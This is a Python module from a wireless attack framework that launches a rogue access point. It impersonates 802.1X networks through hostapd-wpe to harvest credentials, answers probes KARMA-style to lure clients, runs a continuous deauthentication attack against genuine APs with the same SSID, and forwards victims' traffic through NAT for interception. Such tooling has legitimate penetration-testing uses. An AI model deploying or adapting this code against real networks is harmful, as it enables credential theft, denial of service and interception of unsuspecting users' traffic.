import argparse
from ipaddress import ip_network
from subprocess import run

import iptc
from pathlib2 import Path
from pony.orm import *
from pyric import pyw

from pinecone.core.database import ExtendedServiceSet
from pinecone.core.script import BaseScript
from pinecone.utils.template import to_args_str


class Module(BaseScript):
    META = {
        "id": "scripts/infrastructure/ap",
        "name": "AP script",
        "author": "Valentín Blanco (https://github.com/valenbg1)",
        "version": "1.0.0",
        "description": "Runs an AP with DNS and DHCP capabilities. Supports impersonation attacks against 802.1X "
                       "networks and also KARMA-style gratuitous probe responses.",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {"attack/deauth", "daemon/dnsmasq", "daemon/hostapd-wpe"}
    }
    META["options"].add_argument("-i", "--iface", help="AP mode capable WLAN interface", default="wlan0",
                                 metavar="INTERFACE")
    META["options"].add_argument("-c", "--channel", help="AP channel", default=1, type=int)
    META["options"].add_argument("-e", "--encryption", help="AP encryption", default="WPA2",
                                 choices=("OPN", "WEP", "WPA", "WPA/WPA2", "WPA2"))
    META["options"].add_argument("-m", "--mgt", help="use MGT (802.1X) authn mode instead of PSK (for WPA modes)",
                                 action="store_true")
    META["options"].add_argument("-p", "--password", help="AP password (only for WEP or any WPA mode with PSK authn)",
                                 default="password12345")
    META["options"].add_argument("-s", "--ssid", help="AP SSID", default="PINECONEWIFI")
    META["options"].add_argument("-k", "--karma",
                                 help="respond to all directed probe requests (KARMA-style gratuitous probe responses)",
                                 action="store_true")
    META["options"].add_argument("-d", "--deauth", help="perform a continuous deauth attack to all clients connected "
                                                        "to any access point that announce the same SSID (argument "
                                                        "--ssid) on the same channel (argument --channel) after the "
                                                        "rogue AP is started. Requires these APs to previously be in "
                                                        "the recon db (use the module discovery/recon to populate it), "
                                                        "and your WiFi card to support multiple interfaces. The deauth "
                                                        "attack can be stopped using ctrl-c.", action="store_true")
    META["options"].add_argument("--mac-acl",
                                 help="path to a MAC addresses whitelist. If specified, all the clients whose MAC "
                                      "address is not in this list will be rejected.",
                                 metavar="MAC_ACL_PATH")
    META["options"].add_argument("-o", "--out-iface",
                                 help="output interface (no-LAN packets will be redirected there).", default="eth0",
                                 metavar="OUTPUT_INTERFACE")
    META["options"].add_argument("-r", "--router-ip", help="router LAN IP", default="192.168.0.1")
    META["options"].add_argument("-n", "--netmask", help="network netmask", default="255.255.255.0")
    META["options"].add_argument("--dhcp-start-addr", help="DHCP start address", default="192.168.0.50")
    META["options"].add_argument("--dhcp-end-addr", help="DHCP end address", default="192.168.0.150")
    META["options"].add_argument("--dhcp-lease-time", help="DHCP lease time", default="12h")

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_ap_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_ap_script"

    STOP_SCRIPT_PATH = Path(Path(__file__).parent, "stop_ap_script").resolve()  # type: Path

    def __init__(self):
        super().__init__()

    def run(self, args, cmd):
        script_args = argparse.Namespace()

        script_args.hostapd_wpe_args = to_args_str({
            "iface": args.iface,
            "channel": args.channel,
            "encryption": args.encryption,
            "mgt": args.mgt,
            "password": args.password,
            "ssid": args.ssid,
            "karma": args.karma,
            "mac-acl": args.mac_acl
        })

        script_args.dnsmasq_args = to_args_str({
            "start-addr": args.dhcp_start_addr,
            "end-addr": args.dhcp_end_addr,
            "lease-time": args.dhcp_lease_time,
        })

        script_args.deauth_args_lst = []
        additional_mon_iface = None

        if args.deauth:
            additional_mon_iface_name = "{}mon".format(args.iface)
            cmd.pfeedback(
                "[i] Creating additional monitor mode interface {} for the continuous deauth attack...".format(
                    additional_mon_iface_name))
            additional_mon_iface = pyw.devadd(pyw.getcard(args.iface), additional_mon_iface_name, "monitor")

            with db_session:
                try:
                    for bss in ExtendedServiceSet[args.ssid].bssets.select(lambda bss: bss.channel == args.channel):
                        script_args.deauth_args_lst.append(to_args_str({
                            "iface": additional_mon_iface_name,
                            "bssid": bss.bssid,
                            "channel": 0,
                            "num-frames": 0,
                            # "client": "FF:FF:FF:FF:FF:FF"
                        }))
                except:
                    pass

        pyw.ifaddrset(pyw.getcard(args.iface), args.router_ip, args.netmask)

        run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

        cmd.pfeedback(
            "[i] Creating NAT rules in iptables for forwarding {} -> {}...".format(args.iface, args.out_iface))
        iptc.Table(iptc.Table.NAT).flush()
        nat_rule = iptc.Rule()
        nat_rule.src = str(ip_network("{}/{}".format(args.router_ip, args.netmask), strict=False))
        nat_rule.out_interface = args.out_iface
        nat_rule.target = nat_rule.create_target("MASQUERADE")
        iptc.Chain(iptc.Table(iptc.Table.NAT), "POSTROUTING").append_rule(nat_rule)

        cmd.pfeedback("[i] Starting hostapd-wpe and dnsmasq...")
        super().run(script_args, cmd)

        if additional_mon_iface:
            cmd.pfeedback("[i] Deleting the additional monitor mode interface created for the continuous deauth "
                          "attack...")
            pyw.devdel(additional_mon_iface)

    def stop(self, cmd):
        cmd.pfeedback("[i] Stopping hostapd-wpe and dnsmasq...")
        super().stop(cmd)

        run(["sysctl", "-w", "net.ipv4.ip_forward=0"])

        cmd.pfeedback("[i] Flushing NAT table in iptables...")
        iptc.Table(iptc.Table.NAT).flush()
